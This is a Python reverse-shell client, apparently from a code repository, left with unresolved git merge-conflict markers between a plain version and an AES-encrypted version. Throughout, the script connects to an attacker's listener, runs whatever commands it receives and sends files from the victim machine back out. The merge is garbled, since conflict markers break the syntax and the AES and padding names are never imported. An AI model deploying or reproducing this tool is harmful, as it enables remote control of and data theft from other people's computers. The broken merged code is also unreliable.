#!/usr/bin/env python3
import socket
import subprocess
import os

<<<<<<< HEAD
SERVER_IP = "127.0.0.1"  # Change to your listener's IP
SERVER_PORT = 4444       # Change to your listener's port
=======
# Configuration - MUST MATCH THE LISTENER'S KEY!
KEY = b'06237af0fe8b25379915929d4f0cfc50913d43ffb6aa5cd090d3f9945c7603de'
SERVER_IP, SERVER_PORT = "127.0.0.1", 4444

def encrypt(data):
    iv = os.urandom(16)
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    return iv + cipher.encrypt(pad(data, AES.block_size))
>>>>>>> 9e90a79 (Save local changes before pulling updates)

def decrypt(data):
    iv = data[:16]
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(data[16:]), AES.block_size)

def connect():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
<<<<<<< HEAD
=======
    client.connect((SERVER_IP, SERVER_PORT))
    print(f"[*] Connected to {SERVER_IP}:{SERVER_PORT} (AES-256)")

>>>>>>> 9e90a79 (Save local changes before pulling updates)
    try:
        client.connect((SERVER_IP, SERVER_PORT))
        print(f"[*] Connected to {SERVER_IP}:{SERVER_PORT}")

        while True:
<<<<<<< HEAD
            data = client.recv(4096).decode()
            if not data:
                break

            # Exit session
            if data.lower() == "exit":
                break

            # Upload file (client -> server)
            elif data.startswith("upload "):
                file_path = data.split(" ", 1)[1]
=======
            encrypted_cmd = client.recv(4096)
            cmd = decrypt(encrypted_cmd)
            
            # File upload (client -> server)
            if cmd.startswith(b"upload "):
                file_path = cmd.split(maxsplit=1)[1].decode()
>>>>>>> 9e90a79 (Save local changes before pulling updates)
                if os.path.exists(file_path):
                    with open(file_path, "rb") as f:
                        file_data = f.read()
                        client.sendall(file_data)
                    client.send(b"UPLOAD_COMPLETE")
                else:
                    client.send(b"File not found.")

            # Execute command
            else:
<<<<<<< HEAD
                try:
                    output = subprocess.getoutput(data)
                    client.send(output.encode() or b"No output")
                except Exception as e:
                    client.send(f"Error: {str(e)}".encode())

    except ConnectionRefusedError:
        print("[!] Connection refused. Is the listener running?")
=======
                if cmd.lower() == b"exit": break
                output = subprocess.getoutput(cmd.decode())
                client.send(encrypt(output.encode()))
                
>>>>>>> 9e90a79 (Save local changes before pulling updates)
    finally:
        client.close()

if __name__ == "__main__":
    connect()
